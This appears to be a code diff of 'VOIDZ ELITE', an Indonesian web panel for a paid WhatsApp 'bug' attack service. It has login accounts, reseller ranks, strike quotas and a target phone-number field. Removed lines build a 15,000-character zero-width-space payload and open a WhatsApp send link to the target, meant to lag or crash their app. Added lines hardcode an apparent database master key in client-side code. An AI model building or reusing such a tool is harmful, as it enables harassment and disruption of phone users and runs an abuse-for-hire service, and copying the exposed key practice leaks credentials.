@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VOIDZ ELITE V1 - SUPREME LONG EDITION</title>
+    <title>VOIDZ ELITE V1 - FINAL SUPREME</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
@@ -11,32 +11,32 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
         body { background: #000; color: #fff; height: 100vh; width: 100vw; overflow: hidden; position: relative; }
         
-        /* CANVAS ABU ROKOK */
+        /* FIX: PARTIKEL LAYER PALING BELAKANG */
         #ash-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
 
         .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; background: transparent; }
         .neon-red { color: var(--neon); text-shadow: 0 0 10px var(--neon); font-family: 'Orbitron'; font-weight: 900; }
         
-        /* LOGIN PAGE */
+        /* LOGIN */
         #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; }
-        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); box-shadow: 0 10px 30px rgba(0,0,0,0.8); position: relative; z-index: 20; }
+        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); position: relative; z-index: 50; }
         
-        /* DASHBOARD COMPONENTS */
+        /* STATUS GEDE */
         .tab-content { display: none; padding: 20px; overflow-y: auto; height: 100%; padding-bottom: 100px; }
         .active-tab { display: block; }
-        
         .home-info { background: var(--card); border: 1px solid #222; padding: 20px; border-radius: 15px; border-left: 6px solid var(--fire); margin-top: 25px; }
         .status-item { margin-bottom: 12px; display: flex; flex-direction: column; border-bottom: 1px solid #111; padding-bottom: 5px; }
-        .status-label { font-size: 9px; color: #666; font-family: 'Orbitron'; }
-        .status-value { font-size: 18px; font-weight: 900; color: #fff; font-family: 'Orbitron'; }
+        .status-label { font-size: 10px; color: #666; font-family: 'Orbitron'; letter-spacing: 1px; }
+        .status-value { font-size: 20px; font-weight: 900; color: #fff; font-family: 'Orbitron'; }
         .status-value.highlight { color: var(--fire); text-shadow: 0 0 10px var(--fire); }
 
+        /* BUTTONS & INPUT */
         .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 5px; outline: none; }
-        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; transition: 0.3s; position: relative; z-index: 30; }
+        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; transition: 0.3s; position: relative; z-index: 100; display: block; }
+        .btn-main:active { transform: scale(0.95); }
         .btn-main:disabled { background: #444; color: #888; cursor: not-allowed; }
 
-        /* LIST & TERMINAL */
-        .terminal-box { background: #050505; border: 1px solid #222; padding: 10px; height: 150px; overflow-y: auto; font-size: 9px; color: #0f0; border-radius: 5px; margin-top: 15px; }
+        .terminal-box { background: #050505; border: 1px solid #222; padding: 10px; height: 120px; overflow-y: auto; font-size: 9px; color: #0f0; border-radius: 5px; margin-top: 15px; border-left: 2px solid #0f0; }
         .user-card { background: #0a0a0a; border: 1px solid #222; padding: 10px; border-radius: 8px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
 
         .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; }
@@ -65,19 +65,19 @@
             <div id="tabHOME" class="tab-content active-tab">
                 <div class="header-title neon-red" style="text-align:center; margin-top:30px; font-size:20px;">DASHBOARD</div>
                 <div class="home-info">
-                    <div class="status-item"><span class="status-label">ID</span><span id="uName" class="status-value highlight">...</span></div>
-                    <div class="status-item"><span class="status-label">RANK</span><span id="uRole" class="status-value">...</span></div>
-                    <div class="status-item" style="border:none;"><span class="status-label">QUOTA</span><span id="uQuota" class="status-value highlight">...</span></div>
+                    <div class="status-item"><span class="status-label">Operator ID</span><span id="uName" class="status-value highlight">...</span></div>
+                    <div class="status-item"><span class="status-label">Rank Status</span><span id="uRole" class="status-value">...</span></div>
+                    <div class="status-item" style="border:none;"><span class="status-label">Strike Quota</span><span id="uQuota" class="status-value highlight">...</span></div>
                 </div>
                 
-                <div id="ownerMenu" style="display:none; margin-top:20px; display:grid; grid-template-columns:1fr 1fr; gap:10px;">
+                <div id="ownerMenu" style="display:none; margin-top:20px; grid-template-columns:1fr 1fr; gap:10px;">
                     <button class="btn-main" style="font-size:10px; padding:10px;" onclick="openGen()">GEN UNIT</button>
                     <button class="btn-main" style="font-size:10px; padding:10px; background:#0088ff;" onclick="openList()">USER LIST</button>
                 </div>
 
                 <div class="terminal-box" id="terminalLog">
                     [SYSTEM] VOIDZ ELITE READY...<br>
-                    [SYSTEM] WAITING FOR COMMAND...
+                    [SYSTEM] DATABASE CONNECTED.
                 </div>
             </div>
 
@@ -86,9 +86,8 @@
                 <div style="background:var(--card); padding:20px; border-radius:15px; border-top:2px solid var(--fire); margin-top:20px;">
                     <input type="text" id="targetBug" class="input-box" placeholder="Target WA (628xxx)">
                     <select id="bugType" class="input-box">
-                        <option value="VOIDZ_SUPREME">💀 VOIDZ SUPREME (WORK)</option>
+                        <option value="VOIDZ_SUPREME">💀 VOIDZ SUPREME (FIX)</option>
                         <option value="LAG_RENDER">❄️ RENDER CRASH (V2)</option>
-                        <option value="TEXT_LAG">🔥 TEXT LAG (V1)</option>
                     </select>
                     <button class="btn-main" onclick="startAttack()">EXECUTE STRIKE</button>
                 </div>
@@ -102,57 +101,44 @@
         </nav>
     </div>
 
-    <div id="modalGen" class="modal">
-        <div class="modal-content">
-            <h3 class="neon-red" style="font-size:14px; text-align:center; margin-bottom:15px;">GENERATE UNIT</h3>
-            <input type="text" id="gUser" class="input-box" placeholder="NEW ID">
-            <input type="text" id="gPass" class="input-box" placeholder="NEW PW">
-            <select id="gRole" class="input-box">
-                <option value="member">MEMBER</option>
-                <option value="reseller">RESELLER</option>
-            </select>
-            <input type="number" id="gQuota" class="input-box" placeholder="QUOTA">
-            <button class="btn-main" onclick="doGenerate()">PUSH TO DATABASE</button>
-            <button onclick="closeModal('modalGen')" style="width:100%; background:none; border:none; color:#444; font-size:9px; margin-top:10px;">CANCEL</button>
-        </div>
-    </div>
+    <div id="modalGen" class="modal"><div class="modal-content">
+        <h3 class="neon-red" style="font-size:14px; text-align:center;">GENERATE UNIT</h3>
+        <input type="text" id="gUser" class="input-box" placeholder="ID"><input type="text" id="gPass" class="input-box" placeholder="PW">
+        <select id="gRole" class="input-box"><option value="member">MEMBER</option><option value="reseller">RESELLER</option></select>
+        <input type="number" id="gQuota" class="input-box" placeholder="QUOTA">
+        <button class="btn-main" onclick="doGenerate()">PUSH UNIT</button>
+        <button onclick="closeModal('modalGen')" style="width:100%; background:none; border:none; color:#444; font-size:9px; margin-top:10px;">CANCEL</button>
+    </div></div>
 
-    <div id="modalList" class="modal">
-        <div class="modal-content" style="max-width:350px; height:70vh; display:flex; flex-direction:column;">
-            <h3 class="neon-red" style="font-size:14px; text-align:center; margin-bottom:15px;">USER MANAGER</h3>
-            <div id="userListArea" style="flex:1; overflow-y:auto; margin-bottom:10px;"></div>
-            <button onclick="closeModal('modalList')" class="btn-main">CLOSE</button>
-        </div>
-    </div>
+    <div id="modalList" class="modal"><div class="modal-content" style="height:70vh; display:flex; flex-direction:column;">
+        <h3 class="neon-red" style="font-size:14px; text-align:center;">USER LIST</h3>
+        <div id="userListArea" style="flex:1; overflow-y:auto; margin:10px 0;"></div>
+        <button onclick="closeModal('modalList')" class="btn-main">CLOSE</button>
+    </div></div>
 
-    <div id="modalConfig" class="modal">
-        <div class="modal-content">
-            <h3 class="neon-red" style="font-size:14px; text-align:center; margin-bottom:15px;">SYSTEM CONFIG</h3>
-            <input type="text" id="cfgKey" class="input-box" placeholder="JSONBin Master Key">
-            <input type="text" id="cfgTeleToken" class="input-box" placeholder="Bot Token">
-            <input type="text" id="cfgTeleID" class="input-box" placeholder="Chat ID">
-            <button class="btn-main" onclick="saveConfig()">SAVE CONFIG</button>
-            <button onclick="closeModal('modalConfig')" style="width:100%; background:none; border:none; color:#444; font-size:9px; margin-top:10px;">CLOSE</button>
-        </div>
-    </div>
+    <div id="modalConfig" class="modal"><div class="modal-content">
+        <h3 class="neon-red" style="font-size:14px; text-align:center;">CONFIG</h3>
+        <input type="text" id="cfgTeleToken" class="input-box" placeholder="Tele Token">
+        <input type="text" id="cfgTeleID" class="input-box" placeholder="Tele ID">
+        <button class="btn-main" onclick="saveConfig()">SAVE</button>
+        <button onclick="closeModal('modalConfig')" style="width:100%; background:none; border:none; color:#444; font-size:9px; margin-top:10px;">CLOSE</button>
+    </div></div>
 
     <script>
         const BIN_ID = '694a5a6fae596e708fabef99';
-        let API_KEY = localStorage.getItem('cfg_key') || '';
+        const API_KEY = '$2a$10$dgiow6eyY5CjGfEYQtuAQ.E6b5sEA7j91bc4IexzX9cWV3uAksXgW';
         let TELE_TOKEN = localStorage.getItem('cfg_tele_token') || '';
         let TELE_ID = localStorage.getItem('cfg_tele_id') || '';
         let DB = {}; let USER = {};
 
-        // ENGINE ABU ROKOK
+        // PARTIKEL ENGINE
         const canvas = document.getElementById('ash-canvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
         function initParts() {
             canvas.width = window.innerWidth; canvas.height = window.innerHeight;
             particles = [];
-            for(let i=0; i<60; i++) {
-                particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2, sy: Math.random()*0.4+0.1, o: Math.random()*0.5 });
-            }
+            for(let i=0; i<60; i++) particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2, sy: Math.random()*0.4+0.1, o: Math.random()*0.5 });
         }
         function drawParts() {
             ctx.clearRect(0,0,canvas.width, canvas.height);
@@ -165,31 +151,15 @@
         }
         initParts(); drawParts();
 
-        function addLog(msg) {
-            const t = document.getElementById('terminalLog');
-            t.innerHTML += `<br>[LOG] ${msg}`;
-            t.scrollTop = t.scrollHeight;
-        }
-
-        async function sendTele(act, detail) {
-            if(!TELE_TOKEN || !TELE_ID) return;
-            const text = `🚀 *VOIDZ ELITE MONITOR*\n\n📌 *ACTION:* ${act}\n📝 *DETAIL:* ${detail}`;
-            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELE_ID, text: text, parse_mode: 'Markdown' })
-            });
-        }
-
+        function addLog(m) { const t = document.getElementById('terminalLog'); t.innerHTML += `<br>[LOG] ${m}`; t.scrollTop = t.scrollHeight; }
+        
         async function auth() {
             const u = document.getElementById('lUser').value.trim();
             const p = document.getElementById('lPass').value.trim();
-            if(!API_KEY) return alert("ISI MASTER KEY DI MENU CONFIG!");
-            
-            document.getElementById('btnLog').innerText = "CONNECTING...";
+            const btn = document.getElementById('btnLog');
+            btn.innerText = "AUTHENTICATING...";
             try {
-                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-                    headers: {'X-Master-Key': API_KEY, 'X-Bin-Meta': false}
-                });
+                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers: {'X-Master-Key': API_KEY, 'X-Bin-Meta': false} });
                 DB = await res.json();
                 if(DB[u] && DB[u].pw === p) {
                     USER = { id: u, ...DB[u] };
@@ -201,10 +171,9 @@
                         document.getElementById('ownerMenu').style.display = 'grid';
                     }
                     renderHome();
-                    sendTele("LOGIN", `Operator ${u} entered the system.`);
-                    addLog(`Welcome back, ${u}. System online.`);
-                } else { alert("ID/PW SALAH!"); document.getElementById('btnLog').innerText = "IGNITE"; }
-            } catch(e) { alert("DB ERROR! PERIKSA MASTER KEY."); document.getElementById('btnLog').innerText = "IGNITE"; }
+                    addLog(`Access granted. Hello ${u}.`);
+                } else { alert("WRONG ID/PW"); btn.innerText = "IGNITE"; }
+            } catch(e) { alert("CONNECTION ERROR"); btn.innerText = "IGNITE"; }
         }
 
         function renderHome() {
@@ -222,59 +191,33 @@
 
         async function startAttack() {
             const t = document.getElementById('targetBug').value.trim();
-            const type = document.getElementById('bugType').value;
-            if(!t) return alert("TARGET KOSONG!");
-            if(USER.role !== 'owner' && USER.quota <= 0) return alert("QUOTA HABIS!");
-
-            addLog(`Executing strike on ${t}...`);
-            if(USER.role !== 'owner') {
-                USER.quota--; DB[USER.id].quota = USER.quota;
-                await updateDB(); renderHome();
-            }
-            
-            sendTele("STRIKE", `Target: ${t} | Operator: ${USER.id}`);
-            let payload = "VOIDZ_SUPREME" + "\u200B".repeat(15000);
-            window.open(`https://api.whatsapp.com/send?phone=${t.replace(/\D/g,'')}&text=${encodeURIComponent(payload)}`, '_blank');
+            if(!t) return alert("EMPTY TARGET");
+            if(USER.role !== 'owner' && USER.quota <= 0) return alert("NO QUOTA");
+            addLog(`Striking ${t}...`);
+            if(USER.role !== 'owner') { USER.quota--; DB[USER.id].quota = USER.quota; await updateDB(); renderHome(); }
+            window.open(`https://api.whatsapp.com/send?phone=${t.replace(/\D/g,'')}&text=VOIDZ_SUPREME_STRIKE`, '_blank');
         }
 
-        // GENERATOR & LIST USER
         function openGen() { document.getElementById('modalGen').style.display = 'flex'; }
         async function doGenerate() {
             const u = document.getElementById('gUser').value.trim();
             const p = document.getElementById('gPass').value.trim();
             const r = document.getElementById('gRole').value;
             const q = parseInt(document.getElementById('gQuota').value) || 0;
-            if(!u || !p) return alert("LENGKAPI DATA!");
-            
+            if(!u || !p) return;
             DB[u] = { pw: p, role: r, quota: q };
-            await updateDB();
-            addLog(`Unit ${u} created successfully.`);
-            sendTele("GENERATE UNIT", `New ID: ${u} | Role: ${r}`);
-            closeModal('modalGen');
+            await updateDB(); addLog(`User ${u} created.`); closeModal('modalGen');
         }
 
         function openList() {
             document.getElementById('modalList').style.display = 'flex';
-            const area = document.getElementById('userListArea');
-            area.innerHTML = "";
+            const area = document.getElementById('userListArea'); area.innerHTML = "";
             Object.keys(DB).forEach(id => {
-                area.innerHTML += `
-                <div class="user-card">
-                    <div><b style="color:var(--fire)">${id}</b><br><small>${DB[id].role} | Q: ${DB[id].quota}</small></div>
-                    <i class="fas fa-trash" style="color:red; cursor:pointer;" onclick="delUser('${id}')"></i>
-                </div>`;
+                area.innerHTML += `<div class="user-card"><div><b>${id}</b><br><small>${DB[id].role}</small></div><i class="fas fa-trash" style="color:red;" onclick="delUser('${id}')"></i></div>`;
             });
         }
+        async function delUser(id) { if(confirm(`Delete ${id}?`)) { delete DB[id]; await updateDB(); openList(); } }
 
-        async function delUser(id) {
-            if(id === USER.id) return alert("GAK BISA HAPUS DIRI SENDIRI!");
-            if(confirm(`Hapus user ${id}?`)) {
-                delete DB[id]; await updateDB(); openList();
-                addLog(`User ${id} terminated.`);
-            }
-        }
-
-        // UI HELPERS
         function switchTab(t, el) {
             document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab'));
             document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab');
@@ -284,7 +227,6 @@
         function openConfig() { document.getElementById('modalConfig').style.display = 'flex'; }
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
         function saveConfig() {
-            localStorage.setItem('cfg_key', document.getElementById('cfgKey').value.trim());
             localStorage.setItem('cfg_tele_token', document.getElementById('cfgTeleToken').value.trim());
             localStorage.setItem('cfg_tele_id', document.getElementById('cfgTeleID').value.trim());
             location.reload();
